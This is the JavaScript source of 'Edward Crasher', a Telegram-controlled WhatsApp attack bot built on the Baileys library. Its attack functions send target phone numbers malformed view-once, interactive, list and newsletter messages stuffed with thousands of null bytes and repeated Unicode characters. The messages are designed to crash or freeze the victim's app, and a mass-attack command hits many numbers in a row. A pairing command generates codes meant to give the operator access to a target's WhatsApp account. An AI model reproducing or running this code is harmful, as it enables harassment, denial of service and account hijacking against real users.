const { Telegraf, Markup } = require('telegraf');
const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, generateWAMessageFromContent, DisconnectReason } = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const moment = require('moment-timezone');
const axios = require('axios');
const config = require('./config');

// Initialize Telegram Bot
const bot = new Telegraf(config.TELEGRAM_BOT_TOKEN);

// Global variables
let edward = null;
let isConnected = false;
let sessionStatus = 'disconnected';
let attackHistory = [];
let blockedTargets = [];
let userCooldowns = new Map();

// Check if user is authorized
function isAuthorizedUser(ctx) {
    const userId = ctx.from.id.toString();
    return config.AUTHORIZED_USERS.includes(userId);
}

// Initialize WhatsApp connection
async function initializeWhatsApp() {
    console.log(chalk.blue.bold(`
╔══════════════════════════════════════╗
║          EDWARD CRASHER v3.0         ║
║      Telegram + WhatsApp Edition     ║
║         Created by Edward Tech       ║
╚══════════════════════════════════════╝
    `));
    
    try {
        const { state, saveCreds } = await useMultiFileAuthState(config.SESSION_NAME);
        const { version } = await fetchLatestBaileysVersion();
        
        edward = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            auth: state,
            browser: ['Edward Crasher', 'Safari', '3.0'],
            getMessage: async (key) => {
                return {
                    conversation: 'Edward Crasher Active'
                };
            }
        });
        
        // Handle connection updates
        edward.ev.on('connection.update', (update) => {
            const { connection, lastDisconnect } = update;
            
            if (connection === 'open') {
                isConnected = true;
                sessionStatus = 'connected';
                console.log(chalk.green.bold(`
╔══════════════════════════════════════╗
║       WHATSAPP CONNECTION OK         ║
║      Ready to execute commands       ║
╚══════════════════════════════════════╝
                `));
                updateBotStatus();
            }
            
            if (connection === 'close') {
                isConnected = false;
                sessionStatus = 'disconnected';
                const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
                
                console.log(chalk.red.bold(`
╔══════════════════════════════════════╗
║     WHATSAPP DISCONNECTED            ║
║     Reason: ${lastDisconnect.error?.message || 'Unknown'}     ║
╚══════════════════════════════════════╝
                `));
                
                if (shouldReconnect) {
                    console.log(chalk.yellow('Attempting to reconnect...'));
                    setTimeout(initializeWhatsApp, 5000);
                }
            }
        });

        // Handle credentials update
        edward.ev.on('creds.update', saveCreds);
        
    } catch (error) {
        console.error('Failed to initialize WhatsApp:', error);
    }
}

// Update bot status
function updateBotStatus() {
    if (edward && isConnected) {
        edward.updateProfileStatus('Edward Crasher Active ✅');
        edward.sendPresenceUpdate('available');
    }
}

// Check cooldown for user
function checkCooldown(userId) {
    if (!config.ANTI_ABUSE.ENABLED) return true;
    
    const now = Date.now();
    const userCooldown = userCooldowns.get(userId);
    
    if (!userCooldown) {
        userCooldowns.set(userId, { lastAttack: now, attackCount: 1 });
        return true;
    }
    
    const timeDiff = now - userCooldown.lastAttack;
    const cooldownTime = config.ANTI_ABUSE.COOLDOWN_MINUTES * 60 * 1000;
    
    if (timeDiff < cooldownTime && userCooldown.attackCount >= config.ANTI_ABUSE.MAX_TARGETS_PER_DAY) {
        return false;
    }
    
    if (timeDiff >= cooldownTime) {
        userCooldowns.set(userId, { lastAttack: now, attackCount: 1 });
    } else {
        userCooldowns.set(userId, { 
            lastAttack: userCooldown.lastAttack, 
            attackCount: userCooldown.attackCount + 1 
        });
    }
    
    return true;
}

// Telegram Bot Commands
bot.start(async (ctx) => {
    if (!isAuthorizedUser(ctx)) {
        return ctx.reply('❌ Unauthorized access. This bot is private.');
    }
    
    const welcomeMessage = `
🤖 *EDWARD CRASHER TELEGRAM EDITION* 🤖

*Version:* 3.0.0
*Status:* ${isConnected ? '✅ Connected to WhatsApp' : '❌ Disconnected'}

*Available Commands:*
/help - Show all commands
/status - Bot status information
/pair [number] - Get pairing code
/attack [number] - Attack target number
/massattack [n1 n2...] - Attack multiple numbers
/history - Show attack history
/block [number] - Block number
/unblock [number] - Unblock number
/listblocked - Show blocked numbers
/restart - Restart WhatsApp connection

*Note:* Replace [number] with actual numbers (with country code, without +)
    `;
    
    await ctx.replyWithMarkdown(welcomeMessage, Markup.keyboard([
        ['/status', '/help'],
        ['/attack', '/massattack'],
        ['/history', '/listblocked']
    ]).resize());
});

bot.help(async (ctx) => {
    if (!isAuthorizedUser(ctx)) return;
    
    const helpMessage = `
🔧 *EDWARD CRASHER COMMANDS* 🔧

*/status* - Show connection status and statistics
*/pair [number]* - Generate WhatsApp pairing code for a number
*/attack [number]* - Execute attack on target number
*/massattack [n1 n2 n3]* - Attack multiple numbers simultaneously
*/history* - View recent attack history
*/block [number]* - Add number to block list
*/unblock [number]* - Remove number from block list
*/listblocked* - Show all blocked numbers
*/restart* - Restart WhatsApp connection

*Examples:*
/attack 1234567890
/massattack 1234567890 0987654321
/pair 1234567890
/block 1234567890

*⚠️ Important:* Use responsibly and only on numbers you have permission to test.
    `;
    
    await ctx.replyWithMarkdown(helpMessage);
});

bot.command('status', async (ctx) => {
    if (!isAuthorizedUser(ctx)) return;
    
    const statusMessage = `
📊 *EDWARD CRASHER STATUS* 📊

*WhatsApp Connection:* ${isConnected ? '✅ Connected' : '❌ Disconnected'}
*Session Status:* ${sessionStatus}
*Total Attacks:* ${attackHistory.length}
*Blocked Targets:* ${blockedTargets.length}
*Uptime:* ${Math.floor(process.uptime())} seconds

*System Information:*
- Node.js: ${process.version}
- Platform: ${process.platform}
- Memory: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB

*Cooldown Status:* ${config.ANTI_ABUSE.ENABLED ? 'Active' : 'Inactive'}
    `;
    
    await ctx.replyWithMarkdown(statusMessage);
});

bot.command('pair', async (ctx) => {
    if (!isAuthorizedUser(ctx)) return;
    
    const number = ctx.message.text.split(' ')[1];
    if (!number) {
        return ctx.reply('❌ Please provide a number. Example: /pair 1234567890');
    }
    
    if (!edward) {
        return ctx.reply('❌ WhatsApp connection not initialized. Please wait...');
    }
    
    try {
        await ctx.reply('🔐 Generating pairing code...');
        
        // Format number
        const formattedNumber = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        // Request pairing code
        const code = await edward.requestPairingCode(formattedNumber);
        const formattedCode = code.match(/.{1,3}/g).join('-');
        
        const response = `
✅ *PAIRING CODE GENERATED*

📞 *Number:* ${number}
🔢 *Code:* \`${formattedCode}\`

*Instructions:*
1. Open WhatsApp on target phone
2. Go to Linked Devices → Link a Device
3. Tap "Link with phone number instead"
4. Enter the code above

*⚠️ Note:* This will give you access to the target's WhatsApp.
        `;
        
        await ctx.replyWithMarkdown(response);
    } catch (error) {
        console.error('Pairing error:', error);
        await ctx.reply('❌ Failed to generate pairing code. Please check the number format.');
    }
});

bot.command('attack', async (ctx) => {
    if (!isAuthorizedUser(ctx)) return;
    
    if (!isConnected) {
        return ctx.reply('❌ WhatsApp is not connected. Please wait for connection.');
    }
    
    const number = ctx.message.text.split(' ')[1];
    if (!number) {
        return ctx.reply('❌ Please provide a target number. Example: /attack 1234567890');
    }
    
    // Check cooldown
    if (!checkCooldown(ctx.from.id.toString())) {
        return ctx.reply('❌ Cooldown active. Please wait before launching another attack.');
    }
    
    const formattedTarget = number.replace(/[^0-9]/g, '');
    if (blockedTargets.includes(formattedTarget)) {
        return ctx.reply(`❌ Target ${formattedTarget} is blocked. Use /unblock to remove from block list.`);
    }
    
    try {
        await ctx.reply(`🔥 *ATTACK INITIATED* 🔥\n\nTarget: ${formattedTarget}\nPreparing payloads...`);
        
        const jid = formattedTarget + '@s.whatsapp.net';
        let successCount = 0;
        let failCount = 0;
        
        // Execute multiple attack methods
        for (let i = 0; i < config.MAX_ATTACK_ITERATIONS; i++) {
            try {
                // Randomly select an attack method
                const attackMethod = Math.floor(Math.random() * 5);
                
                switch(attackMethod) {
                    case 0:
                        await executeCursorAttack(jid);
                        break;
                    case 1:
                        await executeButtonCrash(jid);
                        break;
                    case 2:
                        await executeInvisibleLoad(jid);
                        break;
                    case 3:
                        await executeOverloadAttack(jid);
                        break;
                    case 4:
                        await executeNewsletterAttack(jid);
                        break;
                }
                
                successCount++;
                // Small delay between attacks
                await new Promise(resolve => setTimeout(resolve, 100));
            } catch (error) {
                failCount++;
                console.error('Attack error:', error);
            }
        }
        
        // Record attack in history
        attackHistory.push({
            target: formattedTarget,
            timestamp: new Date(),
            success: successCount,
            failed: failCount,
            executor: ctx.from.id
        });
        
        const resultMessage = `
✅ *ATTACK COMPLETED*

🎯 *Target:* ${formattedTarget}
✅ *Successful payloads:* ${successCount}
❌ *Failed payloads:* ${failCount}
💥 *Total damage:* ${Math.min(100, successCount * 3)}%

*Next steps:*
- Target's WhatsApp may become unresponsive
- Messages might not load properly
- App could crash repeatedly
        `;
        
        await ctx.replyWithMarkdown(resultMessage);
        
    } catch (error) {
        console.error('Attack failed:', error);
        await ctx.reply(`❌ Attack on ${number} failed. Error: ${error.message}`);
    }
});

bot.command('massattack', async (ctx) => {
    if (!isAuthorizedUser(ctx)) return;
    
    const numbers = ctx.message.text.split(' ').slice(1);
    if (numbers.length < 2) {
        return ctx.reply('❌ Please provide at least 2 targets. Example: /massattack 1234567890 0987654321');
    }
    
    // Check cooldown
    if (!checkCooldown(ctx.from.id.toString())) {
        return ctx.reply('❌ Cooldown active. Please wait before launching another attack.');
    }
    
    await ctx.reply(`☠️ *MASS ATTACK INITIATED* ☠️\n\nTargets: ${numbers.length}\nPreparing multi-target assault...`);
    
    let totalSuccess = 0;
    let totalFailed = 0;
    
    for (const number of numbers) {
        if (number) {
            const formattedTarget = number.replace(/[^0-9]/g, '');
            
            if (blockedTargets.includes(formattedTarget)) {
                await ctx.reply(`⏭️ Skipping blocked target: ${formattedTarget}`);
                continue;
            }
            
            try {
                const jid = formattedTarget + '@s.whatsapp.net';
                let successCount = 0;
                let failCount = 0;
                
                // Execute attacks
                for (let i = 0; i < Math.floor(config.MAX_ATTACK_ITERATIONS / 2); i++) {
                    try {
                        const attackMethod = Math.floor(Math.random() * 3);
                        switch(attackMethod) {
                            case 0: await executeCursorAttack(jid); break;
                            case 1: await executeButtonCrash(jid); break;
                            case 2: await executeInvisibleLoad(jid); break;
                        }
                        successCount++;
                    } catch (error) {
                        failCount++;
                    }
                    await new Promise(resolve => setTimeout(resolve, 50));
                }
                
                totalSuccess += successCount;
                totalFailed += failCount;
                
                attackHistory.push({
                    target: formattedTarget,
                    timestamp: new Date(),
                    success: successCount,
                    failed: failCount,
                    executor: ctx.from.id
                });
                
            } catch (error) {
                console.error(`Attack on ${number} failed:`, error);
            }
            
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
    
    const resultMessage = `
✅ *MASS ATTACK COMPLETED*

🎯 *Targets attacked:* ${numbers.length}
✅ *Total successful payloads:* ${totalSuccess}
❌ *Total failed payloads:* ${totalFailed}
💥 *Overall impact:* High

*Note:* Targets may experience WhatsApp instability
    `;
    
    await ctx.replyWithMarkdown(resultMessage);
});

bot.command('history', async (ctx) => {
    if (!isAuthorizedUser(ctx)) return;
    
    if (attackHistory.length === 0) {
        return ctx.reply('📊 No attack history yet.');
    }
    
    const userHistory = attackHistory.filter(a => a.executor === ctx.from.id);
    if (userHistory.length === 0) {
        return ctx.reply('📊 No attack history for your account.');
    }
    
    let historyText = '📜 *YOUR ATTACK HISTORY*\n\n';
    
    userHistory.slice(-10).forEach((attack, index) => {
        historyText += `*${index + 1}. ${attack.target}* \n`;
        historyText += `   📅 ${moment(attack.timestamp).format('MMM D, HH:mm')}\n`;
        historyText += `   ✅ ${attack.success} successful | ❌ ${attack.failed} failed\n\n`;
    });
    
    await ctx.replyWithMarkdown(historyText);
});

bot.command('block', async (ctx) => {
    if (!isAuthorizedUser(ctx)) return;
    
    const number = ctx.message.text.split(' ')[1];
    if (!number) {
        return ctx.reply('❌ Please provide a number to block. Example: /block 1234567890');
    }
    
    const formattedTarget = number.replace(/[^0-9]/g, '');
    
    if (blockedTargets.includes(formattedTarget)) {
        return ctx.reply(`✅ ${formattedTarget} is already blocked.`);
    }
    
    blockedTargets.push(formattedTarget);
    await ctx.reply(`✅ ${formattedTarget} has been added to the block list.`);
});

bot.command('unblock', async (ctx) => {
    if (!isAuthorizedUser(ctx)) return;
    
    const number = ctx.message.text.split(' ')[1];
    if (!number) {
        return ctx.reply('❌ Please provide a number to unblock. Example: /unblock 1234567890');
    }
    
    const formattedTarget = number.replace(/[^0-9]/g, '');
    const index = blockedTargets.indexOf(formattedTarget);
    
    if (index === -1) {
        return ctx.reply(`✅ ${formattedTarget} is not in the block list.`);
    }
    
    blockedTargets.splice(index, 1);
    await ctx.reply(`✅ ${formattedTarget} has been removed from the block list.`);
});

bot.command('listblocked', async (ctx) => {
    if (!isAuthorizedUser(ctx)) return;
    
    if (blockedTargets.length === 0) {
        return ctx.reply('✅ No numbers are currently blocked.');
    }
    
    let blockList = '🚫 *BLOCKED NUMBERS*\n\n';
    
    blockedTargets.forEach((number, index) => {
        blockList += `${index + 1}. ${number}\n`;
    });
    
    await ctx.reply(blockList);
});

bot.command('restart', async (ctx) => {
    if (!isAuthorizedUser(ctx)) return;
    
    await ctx.reply('🔄 Restarting WhatsApp connection...');
    setTimeout(initializeWhatsApp, 2000);
});

// ================= ATTACK METHODS ================= //

async function executeCursorAttack(target) {
    const message = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "EDWARD CRASHER SYSTEM OVERLOAD" + "ꦽ".repeat(3000),
                    listType: 2,
                    singleSelectReply: { selectedRowId: "💀" },
                    contextInfo: {
                        stanzaId: edward.generateMessageTag(),
                        participant: "0@s.whatsapp.net",
                        mentionedJid: [target],
                        quotedMessage: {
                            buttonsMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/documents/error",
                                    mimetype: "application/octet-stream",
                                    fileSha256: crypto.randomBytes(32),
                                    fileLength: "9999999999",
                                    mediaKey: crypto.randomBytes(32),
                                    fileName: "EDWARD_CRASHER_PAYLOAD" + "\0".repeat(300),
                                    fileEncSha256: crypto.randomBytes(32),
                                },
                                contentText: 'EDWARD CRASHER PAYLOAD DELIVERY',
                                footerText: "SYSTEM OVERLOAD INITIATED",
                                buttons: [{
                                    buttonId: "\u0000".repeat(500),
                                    buttonText: { displayText: "EDWARD CRASHER" },
                                    type: 1
                                }],
                                headerType: 3
                            }
                        }
                    }
                }
            }
        }
    };
    
    await edward.relayMessage(target, message, {});
}

async function executeButtonCrash(target) {
    const message = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "EDWARD CRASHER SECURITY ALERT",
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "CRITICAL SYSTEM ERROR DETECTED" + "\0".repeat(800)
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "single_select",
                            buttonParamsJson: "{}"
                        }]
                    }
                }
            }
        }
    };
    
    await edward.relayMessage(target, message, {});
}

async function executeInvisibleLoad(target) {
    const message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 999,
                    },
                    body: {
                        text: "EDWARD CRASHER INVISIBLE PAYLOAD" + "\0".repeat(1500)
                    },
                    nativeFlowMessage: {
                        buttons: Array(6).fill().map(() => ({
                            name: "call_permission_request",
                            buttonParamsJson: "{}"
                        }))
                    }
                }
            }
        }
    };
    
    await edward.relayMessage(target, message, {});
}

async function executeOverloadAttack(target) {
    const sections = [];
    
    for (let i = 0; i < 3; i++) {
        sections.push({
            title: `EDWARD CRASHER PAYLOAD SECTION ${i}`,
            rows: [{
                title: "\u0000".repeat(800),
                id: `\u0000`.repeat(400),
            }]
        });
    }
    
    const listMessage = {
        title: "EDWARD CRASHER SYSTEM OVERLOAD",
        sections: sections,
    };
    
    const msg = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: 'EDWARD CRASHER OVERLOAD ATTACK' + "ꦽ".repeat(2000)
                        },
                        footer: {
                            buttonParamsJson: JSON.stringify(listMessage)
                        },
                        header: {
                            buttonParamsJson: JSON.stringify(listMessage),
                            subtitle: "SYSTEM CRITICAL FAILURE" + "\u0000".repeat(800)
                        },
                        nativeFlowMessage: {
                            buttons: [{
                                name: "single_select",
                                buttonParamsJson: JSON.stringify(listMessage)
                            }]
                        }
                    }
                }
            }
        },
        { userJid: target }
    );
    
    await edward.relayMessage(target, msg.message, {
        messageId: msg.key.id
    });
}

async function executeNewsletterAttack(target) {
    const message = {
        botInvokeMessage: {
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: `120363000000000000@newsletter`,
                    newsletterName: "EDWARD CRASHER NEWSLETTER" + "ꦾ".repeat(8000),
                    caption: "꯭".repeat(8000),
                    inviteExpiration: Date.now() + 1814400000,
                }
            }
        }
    };
    
    await edward.relayMessage(target, message, {
        userJid: target
    });
}

// Error handling
bot.catch((err, ctx) => {
    console.error(`Error for ${ctx.updateType}:`, err);
});

// Initialize everything
async function startBot() {
    try {
        console.log(chalk.blue('Starting Edward Crasher Telegram Bot...'));
        await initializeWhatsApp();
        await bot.launch();
        console.log(chalk.green('✅ Telegram Bot is now running!'));
    } catch (error) {
        console.error('Failed to start bot:', error);
    }
}

// Start the bot
startBot();

// Enable graceful stop
process.once('SIGINT', () => {
    console.log(chalk.yellow('\nShutting down Edward Crasher...'));
    bot.stop('SIGINT');
    process.exit(0);
});

process.once('SIGTERM', () => {
    console.log(chalk.yellow('\nShutting down Edward Crasher...'));
    bot.stop('SIGTERM');
    process.exit(0);
});